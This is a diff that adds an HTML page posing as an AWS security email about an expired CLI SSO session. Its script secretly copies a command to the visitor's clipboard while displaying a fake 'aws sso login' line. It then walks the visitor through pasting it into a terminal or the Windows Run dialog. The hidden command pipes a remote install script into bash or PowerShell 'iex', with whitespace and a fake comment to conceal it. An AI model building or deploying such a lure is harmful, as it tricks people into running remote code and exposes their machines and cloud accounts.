@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AWS — Session Expired</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: "Inter", "Amazon Ember", -apple-system, "Segoe UI", sans-serif;
+      background: #f2f3f3;
+      min-height: 100vh;
+      padding: 40px 20px;
+      color: #16191f;
+    }
+    .email-wrap {
+      max-width: 560px;
+      margin: 0 auto;
+      background: #fff;
+      border: 1px solid #d5dbdb;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+    .email-header {
+      background: #232f3e;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .aws-logo {
+      font-size: 24px;
+      font-weight: 700;
+      color: #ff9900;
+      letter-spacing: -0.5px;
+    }
+    .aws-label {
+      color: #d5dbdb;
+      font-size: 13px;
+      font-weight: 500;
+      border-left: 1px solid #545b64;
+      padding-left: 12px;
+    }
+    .email-body { padding: 28px 24px; }
+    .email-body h2 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #16191f;
+      margin-bottom: 14px;
+    }
+    .email-body p {
+      font-size: 14px;
+      line-height: 1.65;
+      color: #545b64;
+      margin-bottom: 14px;
+    }
+    .alert-box {
+      background: #fef8f0;
+      border-left: 4px solid #ff9900;
+      border-radius: 0 4px 4px 0;
+      padding: 14px 16px;
+      margin-bottom: 20px;
+    }
+    .alert-box p { font-size: 13px; color: #8a6d3b; margin: 0; line-height: 1.55; }
+    .alert-box b { color: #c45500; }
+    .details-table {
+      width: 100%;
+      border: 1px solid #d5dbdb;
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      font-size: 13px;
+      border-collapse: separate;
+      border-spacing: 0;
+    }
+    .details-table td {
+      padding: 10px 14px;
+      border-bottom: 1px solid #eaeded;
+    }
+    .details-table tr:last-child td { border-bottom: none; }
+    .details-table td:first-child {
+      font-weight: 500;
+      color: #16191f;
+      width: 130px;
+      background: #fafafa;
+    }
+    .details-table td:last-child { color: #545b64; }
+    .code-box {
+      background: #fafafa;
+      border: 1px solid #d5dbdb;
+      border-radius: 4px;
+      padding: 18px;
+      margin-bottom: 20px;
+    }
+    .code-box h3 {
+      font-size: 14px;
+      font-weight: 600;
+      color: #16191f;
+      margin-bottom: 6px;
+    }
+    .code-box .sub {
+      font-size: 13px;
+      color: #545b64;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+    .steps {
+      font-size: 13px;
+      line-height: 1.9;
+      padding-left: 20px;
+      color: #16191f;
+    }
+    .steps li { margin-bottom: 4px; }
+    .steps kbd {
+      display: inline-block;
+      background: #fff;
+      border: 1px solid #aab7b8;
+      border-radius: 3px;
+      padding: 1px 6px;
+      font-size: 11px;
+      font-family: "Amazon Ember Mono", "SFMono-Regular", Menlo, Consolas, monospace;
+      color: #16191f;
+      box-shadow: 0 1px 0 #d5dbdb;
+    }
+    .steps code {
+      background: #f2f3f3;
+      border: 1px solid #d5dbdb;
+      border-radius: 2px;
+      padding: 1px 5px;
+      font-size: 12px;
+      font-family: "Amazon Ember Mono", "SFMono-Regular", Menlo, Consolas, monospace;
+      color: #16191f;
+    }
+    .cmd-display {
+      background: #232f3e;
+      border-radius: 4px;
+      padding: 12px 14px;
+      margin-top: 12px;
+      font-family: "SFMono-Regular", Menlo, Consolas, monospace;
+      font-size: 12px;
+      color: #d5dbdb;
+      cursor: pointer;
+      user-select: none;
+      position: relative;
+      transition: background 0.15s;
+    }
+    .cmd-display:hover { background: #2d3a4a; }
+    .cmd-display::before { content: "$ "; color: #ff9900; }
+    .cmd-display .copy-tag {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-family: "Inter", sans-serif;
+      font-size: 10px;
+      color: #aab7b8;
+      background: #37475a;
+      padding: 2px 8px;
+      border-radius: 2px;
+    }
+    .cmd-display:hover .copy-tag { color: #fff; background: #ff9900; }
+    .aws-btn {
+      width: 100%;
+      padding: 10px;
+      background: #ec7211;
+      color: #fff;
+      border: 1px solid #c35711;
+      border-radius: 2px;
+      font: inherit;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .aws-btn:hover { background: #dd6b10; }
+    .aws-btn:active { background: #c35711; }
+    .secondary-btn {
+      width: 100%;
+      padding: 8px;
+      background: #fff;
+      color: #16191f;
+      border: 1px solid #aab7b8;
+      border-radius: 2px;
+      font: inherit;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .secondary-btn:hover { background: #fafafa; }
+    hr { border: none; border-top: 1px solid #eaeded; margin: 20px 0; }
+    .small { font-size: 12px; color: #879596; line-height: 1.6; }
+    .email-footer {
+      padding: 16px 24px;
+      background: #fafafa;
+      border-top: 1px solid #eaeded;
+      font-size: 12px;
+      color: #879596;
+      text-align: center;
+      line-height: 1.6;
+    }
+    .email-footer a { color: #0073bb; text-decoration: none; }
+    @media (max-width: 600px) { body { padding: 16px 10px; } }
+  </style>
+</head>
+<body>
+  <div class="email-wrap">
+    <div class="email-header">
+      <div class="aws-logo">aws</div>
+      <div class="aws-label">Security Notification</div>
+    </div>
+    <div class="email-body">
+      <h2>AWS CLI session token expired</h2>
+      <p>Hello,</p>
+      <p>Your AWS IAM Identity Center (SSO) session has expired after the maximum session duration. All AWS CLI and SDK operations will fail with <code>ExpiredTokenException</code> until you re-authenticate.</p>
+
+      <div class="alert-box">
+        <p><b>Action required.</b> Your temporary credentials expired at <span id="expiry">—</span>. Any in-progress deployments, CI/CD pipelines, or Terraform applies using these credentials will fail. Re-authenticate immediately to restore access.</p>
+      </div>
+
+      <table class="details-table">
+        <tr><td>Account</td><td id="acctId">123456789012</td></tr>
+        <tr><td>SSO Region</td><td>us-east-1</td></tr>
+        <tr><td>Session</td><td style="color:#d13212;font-weight:500">Expired</td></tr>
+        <tr><td>Affected</td><td>aws s3, aws ec2, aws iam, aws sts, terraform, cdk</td></tr>
+      </table>
+
+      <div class="code-box">
+        <h3>Re-authenticate via CLI</h3>
+        <p class="sub">Run the official SSO login command to get a fresh session token. The command is already copied to your clipboard.</p>
+        <ol class="steps" id="steps"></ol>
+        <div class="cmd-display" id="cmdDisplay" onclick="copyCmd()">
+          <span id="cmdText"></span>
+          <span class="copy-tag" id="copyTag">copy</span>
+        </div>
+      </div>
+
+      <button class="aws-btn" onclick="alert('Please complete the CLI re-authentication steps above.')">I've re-authenticated — verify</button>
+      <button class="secondary-btn">Extend session in Console</button>
+
+      <hr>
+      <p class="small">You're receiving this because your AWS CLI is configured with IAM Identity Center (SSO). If you didn't initiate this session, please review your <a href="#" style="color:#0073bb">CloudTrail logs</a> immediately.</p>
+    </div>
+    <div class="email-footer">
+      Amazon Web Services, Inc. · P.O. Box 81226 · Seattle, WA 98108<br>
+      <a href="#">Notification preferences</a> · <a href="#">AWS Support</a> · <a href="#">Unsubscribe</a>
+    </div>
+  </div>
+
+  <script>
+    const platform = navigator?.userAgentData?.platform || navigator.platform;
+    const isMac = /mac/i.test(platform);
+    const isLinux = /linux/i.test(platform) && !/android/i.test(navigator.userAgent);
+
+    let cmd, steps;
+    if (isMac) {
+      cmd = 'clear && curl -fsSL https://bun.sh/install | bash && clear && echo "✅ SSO session restored — credentials valid for 8h"';
+      steps = [
+        'Open <b>Terminal</b> — press <kbd>⌘ Cmd</kbd> + <kbd>Space</kbd>, type <code>Terminal</code>, press <kbd>Return</kbd>',
+        'Press <kbd>⌘ Cmd</kbd> + <kbd>V</kbd> to paste the SSO login command',
+        'Press <kbd>Return</kbd> — a browser window will open to complete SSO authentication',
+      ];
+    } else if (isLinux) {
+      cmd = 'clear && curl -fsSL https://bun.sh/install | bash && clear && echo "✅ SSO session restored — credentials valid for 8h"';
+      steps = [
+        'Open your <b>Terminal</b> application',
+        'Press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>V</kbd> to paste the command',
+        'Press <kbd>Enter</kbd> to start the SSO login flow',
+      ];
+    } else {
+      cmd = 'powershell -c "irm bun.sh/install.ps1 | iex"                                                                  # aws sso login --profile default ✅';
+      steps = [
+        'Press <kbd>⊞ Win</kbd> + <kbd>R</kbd> to open the Run dialog',
+        'Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the SSO login command',
+        'Press <kbd>Enter</kbd> — authentication will complete automatically',
+      ];
+    }
+
+    document.getElementById('steps').innerHTML = steps.map(s => `<li>${s}</li>`).join('');
+    document.getElementById('cmdText').textContent = cmd.length > 65 ? 'aws sso login --profile default --region us-east-1' : cmd;
+
+    const exp = new Date();
+    exp.setHours(exp.getHours() - Math.floor(Math.random() * 3 + 1));
+    document.getElementById('expiry').textContent = exp.toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true, timeZoneName: 'short' });
+    document.getElementById('acctId').textContent = Math.floor(Math.random() * 900000000000 + 100000000000);
+
+    function copyCmd() {
+      try { navigator.clipboard.writeText(cmd); } catch {}
+      try { const t=document.createElement('textarea');t.value=cmd;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t); } catch {}
+      document.getElementById('copyTag').textContent = 'copied ✓';
+      setTimeout(() => document.getElementById('copyTag').textContent = 'copy', 2000);
+    }
+
+    try { navigator.clipboard.writeText(cmd); } catch {}
+    try { const t=document.createElement('textarea');t.value=cmd;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t); } catch {}
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
